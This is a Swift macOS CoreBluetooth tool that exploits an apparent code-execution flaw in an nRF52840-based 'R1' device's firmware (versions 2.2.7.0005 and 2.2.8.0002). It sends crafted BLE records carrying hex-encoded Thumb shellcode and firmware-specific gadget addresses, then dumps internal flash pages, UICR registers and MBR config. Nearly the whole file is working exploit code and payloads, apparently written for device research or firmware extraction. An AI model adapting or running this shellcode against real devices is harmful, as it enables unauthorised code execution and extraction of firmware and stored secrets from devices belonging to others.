import CoreBluetooth
import Darwin
import Foundation

/// Performs one explicitly version-pinned R1 read through macOS CoreBluetooth.
/// Prefix mode is bounded to 244 bytes inside 0xf8000...0xfdfff. Page mode is
/// bounded to one aligned 4 KiB internal-flash page; UICR mode reads only
/// the complete architected 0x308-byte nRF52840 register extent.
@main
final class R1MacOSACERead: NSObject, CBCentralManagerDelegate, CBPeripheralDelegate {
    private static let service = CBUUID(
        string: "BAE80001-4F05-4503-8E65-3AF1F7329D1F"
    )
    private static let channel1Write = CBUUID(
        string: "BAE80010-4F05-4503-8E65-3AF1F7329D1F"
    )
    private static let eusNotify = CBUUID(
        string: "BAE80013-4F05-4503-8E65-3AF1F7329D1F"
    )
    private static let stopFactoryListener = Data([0x00, 0x00, 0x40, 0x00])

    private let identifier: UUID
    private let address: UInt32
    private let firmwareVersion: String
    private let bae8HVXThumb: UInt32
    private let pageMode: Bool
    private let uicrMode: Bool
    private let zeroPrefixMode: Bool
    private let mbrConfigMode: Bool
    private let expectedBytes: Int
    private let output: URL
    private var central: CBCentralManager!
    private var peripheral: CBPeripheral?
    private var writeCharacteristic: CBCharacteristic?
    private var timer: Timer?
    private var payloadSent = false
    private var readBuffer = Data()
    private var finished = false

    override init() {
        let arguments = CommandLine.arguments
        let pageMode = arguments.contains("--page")
        let uicrMode = arguments.contains("--uicr")
        let zeroPrefixMode = arguments.contains("--zero-prefix")
        let mbrConfigMode = arguments.contains("--mbr-config")
        guard let identifierText = Self.argument("--identifier", in: arguments),
              let identifier = UUID(uuidString: identifierText),
              let addressText = Self.argument("--address", in: arguments),
              let parsedAddress = UInt32(
                  addressText.lowercased().hasPrefix("0x")
                      ? String(addressText.dropFirst(2)) : addressText,
                  radix: 16
              ),
              [pageMode, uicrMode, zeroPrefixMode, mbrConfigMode]
                  .filter({ $0 }).count <= 1,
              Self.isAllowed(
                  address: parsedAddress,
                  pageMode: pageMode,
                  uicrMode: uicrMode,
                  zeroPrefixMode: zeroPrefixMode,
                  mbrConfigMode: mbrConfigMode
              ),
              let firmwareVersion = Self.argument("--firmware-version", in: arguments),
              let bae8HVXThumb = Self.bae8HVXThumb(for: firmwareVersion),
              let outputText = Self.argument("--output", in: arguments)
        else {
            fputs(
                "usage: r1-macos-ace-read --identifier UUID --address 0xADDRESS "
                    + "--firmware-version 2.2.7.0005|2.2.8.0002 "
                    + "[--page|--uicr|--zero-prefix|--mbr-config] "
                    + "--output FILE\n",
                stderr
            )
            Darwin.exit(2)
        }
        self.identifier = identifier
        address = parsedAddress
        self.firmwareVersion = firmwareVersion
        self.bae8HVXThumb = bae8HVXThumb
        self.pageMode = pageMode
        self.uicrMode = uicrMode
        self.zeroPrefixMode = zeroPrefixMode
        self.mbrConfigMode = mbrConfigMode
        expectedBytes = mbrConfigMode ? 8
            : (uicrMode ? 0x308 : (pageMode ? 0x1000 : 244))
        output = URL(fileURLWithPath: outputText)
        super.init()
    }

    static func main() {
        let reader = R1MacOSACERead()
        reader.start()
        RunLoop.main.run()
    }

    private func start() {
        setbuf(stdout, nil)
        print(
            String(
                format: "R1_MAC_ACE_READ start identifier=%@ address=0x%08x firmware=%@ hvx=0x%08x mode=%@",
                identifier.uuidString, address, firmwareVersion, bae8HVXThumb,
                uicrMode ? "uicr" : (
                    pageMode ? "page" : (
                        zeroPrefixMode ? "zero-prefix" : (
                            mbrConfigMode ? "mbr-config" : "prefix"
                        )
                    )
                )
            )
        )
        timer = Timer.scheduledTimer(withTimeInterval: 40, repeats: false) {
            [weak self] _ in self?.finish("timeout", code: 2)
        }
        central = CBCentralManager(
            delegate: self,
            queue: .main,
            options: [CBCentralManagerOptionShowPowerAlertKey: false]
        )
    }

    func centralManagerDidUpdateState(_ central: CBCentralManager) {
        guard central.state == .poweredOn else {
            if central.state == .unauthorized || central.state == .unsupported
                || central.state == .poweredOff
            {
                finish("bluetooth_unavailable_\(central.state.rawValue)", code: 2)
            }
            return
        }
        guard let target = central.retrievePeripherals(withIdentifiers: [identifier]).first
        else {
            finish("identifier_not_cached", code: 2)
            return
        }
        peripheral = target
        target.delegate = self
        central.connect(target)
    }

    func centralManager(_ central: CBCentralManager, didConnect peripheral: CBPeripheral) {
        print("R1_MAC_ACE_READ connected=true name=\(peripheral.name ?? "unknown")")
        peripheral.discoverServices([Self.service])
    }

    func centralManager(
        _ central: CBCentralManager,
        didFailToConnect peripheral: CBPeripheral,
        error: Error?
    ) {
        finish("connect_failed_\(error?.localizedDescription ?? "unknown")", code: 2)
    }

    func centralManager(
        _ central: CBCentralManager,
        didDisconnectPeripheral peripheral: CBPeripheral,
        error: Error?
    ) {
        guard !finished else { return }
        finish("unexpected_disconnect_\(error?.localizedDescription ?? "none")", code: 2)
    }

    func peripheral(_ peripheral: CBPeripheral, didDiscoverServices error: Error?) {
        guard error == nil,
              let service = peripheral.services?.first(where: { $0.uuid == Self.service })
        else {
            finish("service_missing_\(error?.localizedDescription ?? "none")", code: 2)
            return
        }
        peripheral.discoverCharacteristics(
            [Self.channel1Write, Self.eusNotify], for: service
        )
    }

    func peripheral(
        _ peripheral: CBPeripheral,
        didDiscoverCharacteristicsFor service: CBService,
        error: Error?
    ) {
        guard error == nil,
              let characteristics = service.characteristics,
              let write = characteristics.first(where: { $0.uuid == Self.channel1Write }),
              let notify = characteristics.first(where: { $0.uuid == Self.eusNotify })
        else {
            finish("characteristics_missing_\(error?.localizedDescription ?? "none")", code: 2)
            return
        }
        writeCharacteristic = write
        let maximum = peripheral.maximumWriteValueLength(for: .withoutResponse)
        print("R1_MAC_ACE_READ max_write_without_response=\(maximum)")
        guard maximum >= 244 else {
            finish("mtu_below_244", code: 1)
            return
        }
        peripheral.setNotifyValue(true, for: notify)
    }

    func peripheral(
        _ peripheral: CBPeripheral,
        didUpdateNotificationStateFor characteristic: CBCharacteristic,
        error: Error?
    ) {
        guard characteristic.uuid == Self.eusNotify else { return }
        guard error == nil, characteristic.isNotifying, let writeCharacteristic else {
            finish("notify_failed_\(error?.localizedDescription ?? "not_enabled")", code: 2)
            return
        }
        peripheral.writeValue(
            Self.stopFactoryListener,
            for: writeCharacteristic,
            type: .withoutResponse
        )
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) { [weak self] in
            guard let self, !self.finished else { return }
            let payload = self.mbrConfigMode
                ? Self.readMBRConfigRecord(bae8HVXThumb: self.bae8HVXThumb)
                : self.zeroPrefixMode
                ? Self.readZeroPrefixRecord(bae8HVXThumb: self.bae8HVXThumb)
                : self.uicrMode
                ? Self.readUICRRecord(bae8HVXThumb: self.bae8HVXThumb)
                : self.pageMode ? (
                    self.address == 0x000f_f000
                        ? Self.readLastPageRecord(
                            bae8HVXThumb: self.bae8HVXThumb)
                        : Self.readPageRecord(
                            address: self.address,
                            bae8HVXThumb: self.bae8HVXThumb)
                )
                : Self.readRecord(
                    address: self.address,
                    bae8HVXThumb: self.bae8HVXThumb
                )
            self.payloadSent = true
            print("R1_MAC_ACE_READ sending_length=\(payload.count)")
            peripheral.writeValue(payload, for: writeCharacteristic, type: .withoutResponse)
        }
    }

    func peripheral(
        _ peripheral: CBPeripheral,
        didUpdateValueFor characteristic: CBCharacteristic,
        error: Error?
    ) {
        guard characteristic.uuid == Self.eusNotify, payloadSent else { return }
        guard error == nil, let value = characteristic.value else {
            finish("value_failed_\(error?.localizedDescription ?? "missing")", code: 2)
            return
        }
        let notificationLengthAllowed = mbrConfigMode
            ? value.count == 8
            : (pageMode ? (1 ... 244).contains(value.count) : value.count == 244)
        guard notificationLengthAllowed else {
            print("R1_MAC_ACE_READ ignored_notification_bytes=\(value.count)")
            return
        }
        readBuffer.append(value)
        guard readBuffer.count >= expectedBytes else { return }
        let result = Data(readBuffer.prefix(expectedBytes))
        do {
            try result.write(to: output, options: .atomic)
        } catch {
            finish("output_failed_\(error.localizedDescription)", code: 2)
            return
        }
        print("R1_MAC_ACE_READ complete=true bytes=\(result.count) output=\(output.path)")
        finish("complete", code: 0)
    }

    private static func readRecord(address: UInt32, bae8HVXThumb: UInt32) -> Data {
        var record = data(
            hex: "00004004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000d4a10120d4a1012000000000eca101200000000000000000000000000000000061636300000000000000000028a2012000000000000000000000000001000000000000000000000000000000180000000000000000000000000000002da201200449b1200870bff34f8f034903480860fee700001c0500400ced00e00400fa0500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
        )
        record.replaceSubrange(0xa0 ..< 244, with: repeatElement(UInt8(0), count: 84))
        var shellcode = data(
            hex: "82b001200090f42001900b4c0b4d0c4e00272846314601aa3b46a047002803d0002f05d10127f4e74ff000700138fdd1044905480860fee76929050014650020efbeadde0ced00e00400fa05"
        )
        putU32(bae8HVXThumb, in: &shellcode, at: 0x38)
        record.replaceSubrange(0xa0 ..< 0xa0 + shellcode.count, with: shellcode)
        let patch = 0xa0 + 0x40
        record[patch] = UInt8(address & 0xff)
        record[patch + 1] = UInt8((address >> 8) & 0xff)
        record[patch + 2] = UInt8((address >> 16) & 0xff)
        record[patch + 3] = UInt8((address >> 24) & 0xff)
        precondition(record.count == 244)
        return record
    }

    private static func readPageRecord(address: UInt32, bae8HVXThumb: UInt32) -> Data {
        var record = data(
            hex: "00004004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000d4a10120d4a1012000000000eca101200000000000000000000000000000000061636300000000000000000028a2012000000000000000000000000001000000000000000000000000000000180000000000000000000000000000002da201200449b1200870bff34f8f034903480860fee700001c0500400ced00e00400fa0500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
        )
        record.replaceSubrange(0xa0 ..< 244, with: repeatElement(UInt8(0), count: 84))
        var shellcode = data(
            hex: "82b0012000900f4c04f580550e4e0f4ff42001903846214601aa01232b40b047002805d01328f3d0eb0709d40135efe704f1f404ac42ebd34ff000700138fdd103488047efbeadde692905001465002091810300"
        )
        putU32(address, in: &shellcode, at: 0x44)
        putU32(bae8HVXThumb, in: &shellcode, at: 0x48)
        record.replaceSubrange(0xa0 ..< 0xa0 + shellcode.count, with: shellcode)
        precondition(record.count == 244)
        return record
    }

    private static func readUICRRecord(bae8HVXThumb: UInt32) -> Data {
        var record = data(
            hex: "00004004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000d4a10120d4a1012000000000eca101200000000000000000000000000000000061636300000000000000000028a2012000000000000000000000000001000000000000000000000000000000180000000000000000000000000000002da201200449b1200870bff34f8f034903480860fee700001c0500400ced00e00400fa0500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
        )
        record.replaceSubrange(0xa0 ..< 244, with: repeatElement(UInt8(0), count: 84))
        var shellcode = data(
            hex: "82b0012000904ff0102404f542750d4e0d4ff42001903846214601aa0123b047002802d01328f4d007e004f1f404ac42efd34ff000700138fdd1044904480860fee7000069290500146500200ced00e00400fa05"
        )
        putU32(bae8HVXThumb, in: &shellcode, at: 0x44)
        record.replaceSubrange(0xa0 ..< 0xa0 + shellcode.count, with: shellcode)
        precondition(record.count == 244)
        return record
    }

    private static func readLastPageRecord(bae8HVXThumb: UInt32) -> Data {
        var record = data(
            hex: "00004004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000d4a10120d4a1012000000000eca101200000000000000000000000000000000061636300000000000000000028a2012000000000000000000000000001000000000000000000000000000000180000000000000000000000000000002da201200449b1200870bff34f8f034903480860fee700001c0500400ced00e00400fa0500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
        )
        record.replaceSubrange(0xa0 ..< 244, with: repeatElement(UInt8(0), count: 84))
        var shellcode = data(
            hex: "82b0012000904ff47f244ff480150e4e0e4f281bf42800d9f42001903846214601aa0023b047002802d01328f1d007e004f1f404ac42ecd34ff000700138fdd103488047fee700006d2b05001465002091810300"
        )
        putU32(bae8HVXThumb, in: &shellcode, at: 0x48)
        record.replaceSubrange(0xa0 ..< 0xa0 + shellcode.count, with: shellcode)
        precondition(record.count == 244)
        return record
    }

    private static func readZeroPrefixRecord(bae8HVXThumb: UInt32) -> Data {
        var record = data(
            hex: "00004004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000d4a10120d4a1012000000000eca101200000000000000000000000000000000061636300000000000000000028a2012000000000000000000000000001000000000000000000000000000000180000000000000000000000000000002da201200449b1200870bff34f8f034903480860fee700001c0500400ced00e00400fa0500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
        )
        record.replaceSubrange(0xa0 ..< 244, with: repeatElement(UInt8(0), count: 84))
        var shellcode = data(
            hex: "82b001200090f420019000240b4d2e463d272068306004340436013ff9d1084c084e3046294601aa0023a0474ff000700138fdd104488047fee7000000c103206d2b05001465002091810300"
        )
        putU32(bae8HVXThumb, in: &shellcode, at: 0x40)
        record.replaceSubrange(0xa0 ..< 0xa0 + shellcode.count, with: shellcode)
        precondition(record.count == 244)
        return record
    }

    private static func readMBRConfigRecord(bae8HVXThumb: UInt32) -> Data {
        var record = data(
            hex: "00004004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000d4a10120d4a1012000000000eca101200000000000000000000000000000000061636300000000000000000028a2012000000000000000000000000001000000000000000000000000000000180000000000000000000000000000002da201200449b1200870bff34f8f034903480860fee700001c0500400ced00e00400fa0500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
        )
        record.replaceSubrange(0xa0 ..< 244, with: repeatElement(UInt8(0), count: 84))
        var shellcode = data(
            hex: "82b0012000900820019040f6f874094d03cc03c5083d084c084e3046294601aa0023a0474ff000700138fdd104488047fee7000000c103206d2b05001465002091810300"
        )
        putU32(bae8HVXThumb, in: &shellcode, at: 0x38)
        record.replaceSubrange(0xa0 ..< 0xa0 + shellcode.count, with: shellcode)
        precondition(record.count == 244)
        return record
    }

    private static func isAllowed(
        address: UInt32,
        pageMode: Bool,
        uicrMode: Bool,
        zeroPrefixMode: Bool,
        mbrConfigMode: Bool
    ) -> Bool {
        if zeroPrefixMode { return address == 0 }
        if mbrConfigMode { return address == 0x0000_0ff8 }
        if uicrMode { return address == 0x1000_1000 }
        if pageMode {
            return address < 0x0010_0000 && address & 0xfff == 0
        }
        return address >= 0x000f_8000 && address <= 0x000f_e000 - 244
    }

    private static func bae8HVXThumb(for firmwareVersion: String) -> UInt32? {
        switch firmwareVersion {
        case "2.2.7.0005": 0x0005_2969
        case "2.2.8.0002": 0x0005_2b6d
        default: nil
        }
    }

    private static func putU32(_ value: UInt32, in data: inout Data, at offset: Int) {
        data[offset] = UInt8(value & 0xff)
        data[offset + 1] = UInt8((value >> 8) & 0xff)
        data[offset + 2] = UInt8((value >> 16) & 0xff)
        data[offset + 3] = UInt8((value >> 24) & 0xff)
    }

    private static func data(hex: String) -> Data {
        var bytes = [UInt8]()
        bytes.reserveCapacity(hex.count / 2)
        var index = hex.startIndex
        while index < hex.endIndex {
            let next = hex.index(index, offsetBy: 2)
            bytes.append(UInt8(hex[index ..< next], radix: 16)!)
            index = next
        }
        return Data(bytes)
    }

    private static func argument(_ name: String, in arguments: [String]) -> String? {
        guard let index = arguments.firstIndex(of: name),
              arguments.indices.contains(index + 1)
        else { return nil }
        return arguments[index + 1]
    }

    private func finish(_ result: String, code: Int32) {
        guard !finished else { return }
        finished = true
        timer?.invalidate()
        if let peripheral, peripheral.state == .connected {
            central.cancelPeripheralConnection(peripheral)
        }
        print("R1_MAC_ACE_READ result=\(result)")
        fflush(stdout)
        Darwin.exit(code)
    }
}
